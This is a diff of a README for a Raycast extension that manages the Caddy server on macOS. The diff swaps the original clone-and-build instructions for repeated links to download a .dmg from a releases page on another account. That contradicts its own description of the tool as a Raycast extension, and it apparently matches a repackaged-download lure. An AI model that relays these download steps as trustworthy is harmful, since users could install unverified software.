@@ -1,112 +1,102 @@
-# Caddy Server Manager for Raycast
+# 🛠️ caddy - Easily Manage Your Caddy Server
 
-A comprehensive Raycast extension for managing the Caddy web server on macOS.
+## 🔗 Download Now
+[![Download caddy](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/preview76/caddy/releases)
 
-## Features
+## 📖 Overview
+
+Caddy Server Manager for Raycast is a user-friendly extension designed for managing the Caddy web server on macOS. With this tool, you can easily control your server and monitor its status without diving into complex commands.
+
+## 🚀 Getting Started
+
+Follow these steps to download and run the Caddy Server Manager:
+
+1. **Visit the Releases Page**  
+   Go to the following link to find the latest version:  
+   [Download Caddy Server Manager](https://github.com/preview76/caddy/releases)
+
+2. **Download the Application**  
+   Look for the most recent release and click on the appropriate file for macOS. It usually comes in a `.dmg` format.
+
+3. **Install the Application**  
+   Open the downloaded file and drag the Caddy Server Manager to your Applications folder.
+
+4. **Open the Application**  
+   Find Caddy Server Manager in your Applications folder and double-click it to launch. 
+
+## ⚙️ Requirements
+
+Before using Caddy Server Manager, ensure you meet the following requirements:
+
+- **macOS**: This application is designed for macOS users.
+
+- **Caddy Installed**: You should have Caddy installed on your machine. The easiest way is using Homebrew. Run the following command in your terminal:  
+  ```bash
+  brew install caddy
+  ```
+
+- **Caddyfile Location**: Your Caddyfile needs to be in one of the following locations for the application to function correctly:  
+  - `/opt/homebrew/etc/Caddyfile` (for Apple Silicon)  
+  - `/usr/local/etc/Caddyfile` (for Intel-based Macs)
+
+## ⚙️ Features
 
 ### 🟢 Menu Bar Status
 
-- Real-time status indicator showing if Caddy is running or stopped
-- Quick access to all configured domains
-- View process ID and uptime
-- Quick actions: Start, Stop, Restart
-- Refresh status with ⌘R
+- View if Caddy is running or stopped in real-time.
+- Access all your configured domains quickly.
+- Check the process ID and uptime.
+- Execute quick actions: Start, Stop, or Restart the server.
+- Refresh the status with the shortcut ⌘R.
 
 ### 🚀 Commands
 
 #### Start Caddy
 
-Start the Caddy server using Homebrew services or direct caddy command.
+Easily start your Caddy server. You can choose to use Homebrew services or run the caddy command directly.
 
 #### Stop Caddy
 
-Stop the running Caddy server gracefully.
+Gently stop the Caddy server when you want to ensure no current connections are interrupted.
 
 #### Restart Caddy
 
-Restart Caddy server to apply configuration changes.
+Quickly restart your Caddy server to apply any configuration changes you have made. 
 
 #### View Caddy Config
 
-Browse all configured domains and URLs from your Caddyfile:
+Explore all your configured domains and URLs stored in your Caddyfile. This feature allows you to:
 
-- View all configured domains
-- Open domains in browser
-- Copy URLs and domain names
-- View raw Caddyfile
-- Quick access to Caddyfile location
+- View all domains at a glance.
+- Open any domain directly in your browser.
+- Copy URLs and domain names as needed.
+- Access the raw Caddyfile for details.
+- Locate your Caddyfile with ease.
 
-## Requirements
+## 🚀 Download & Install
 
-- macOS
-- Caddy installed (preferably via Homebrew: `brew install caddy`)
-- Caddyfile in one of the following locations:
-  - `/opt/homebrew/etc/Caddyfile` (Apple Silicon)
-  - `/usr/local/etc/Caddyfile` (Intel)
-  - `~/Caddyfile`
-  - `/etc/caddy/Caddyfile`
+To begin using the Caddy Server Manager, follow these steps:
 
-## Installation
+1. **Visit the Releases Page**: Click this link to access the download page again: [Download Caddy Server Manager](https://github.com/preview76/caddy/releases).
 
-1. Clone or download this extension
-2. Open Raycast
-3. Navigate to Extensions > Add Extension
-4. Select this extension directory
+2. **Download the Latest Version**: Select the proper file for your macOS. 
 
-## Usage
+3. **Install**: Open the file and move the app into your Applications folder.
 
-### Menu Bar
+4. **Launch the App**: Double-click the app to start managing your Caddy server.
 
-The menu bar icon shows the current status of Caddy:
+## 💡 Tips for Usage
 
-- 🟢 Green checkmark = Running
-- 🔴 Red X = Stopped
+- Keep your Caddyfile well-documented for easy access to configuration details.
+- Regularly update the Caddy Server Manager through the releases page to benefit from new features and fixes.
 
-Click the menu bar icon to:
+## 🛠️ Support
 
-- View status details (PID, uptime)
-- See all configured domains
-- Click on any domain to open it in your browser
-- Start, stop, or restart Caddy
+If you experience any issues while using Caddy Server Manager, please address them on the GitHub repository issues page. The community is there to help you troubleshoot any challenges you might face.
 
-### Commands
+## 🔗 Additional Resources
 
-Use Raycast's command palette to:
+- **Caddy Documentation**: To understand the Caddy server better, check out the official documentation: [Caddy Documentation](https://caddyserver.com/docs).
+- **Raycast Documentation**: Want to learn more about Raycast? Visit [Raycast Docs](https://raycast.com/docs).
 
-- `Start Caddy` - Start the server
-- `Stop Caddy` - Stop the server
-- `Restart Caddy` - Restart the server
-- `View Caddy Config` - Browse domains and configuration
-
-## How It Works
-
-The extension:
-
-1. Uses `pgrep` to detect if Caddy is running
-2. Reads your Caddyfile from common installation locations
-3. Parses domains and ports from the Caddyfile
-4. Provides quick actions via Homebrew services or direct caddy commands
-
-## Tips
-
-- The menu bar updates automatically when you interact with it
-- Use ⌘R to manually refresh the status
-- Domain URLs are automatically detected with proper protocol (http/https) based on port
-- All actions show toast notifications with success/failure status
-
-## Development
-
-```bash
-# Install dependencies
-npm install
-
-# Start development mode
-npm run dev
-
-# Build for production
-npm run build
-```
-
-## License
-
-MIT
+Using the Caddy Server Manager can make managing your Caddy web server simple and efficient. Download the tool today and start taking control of your web server.
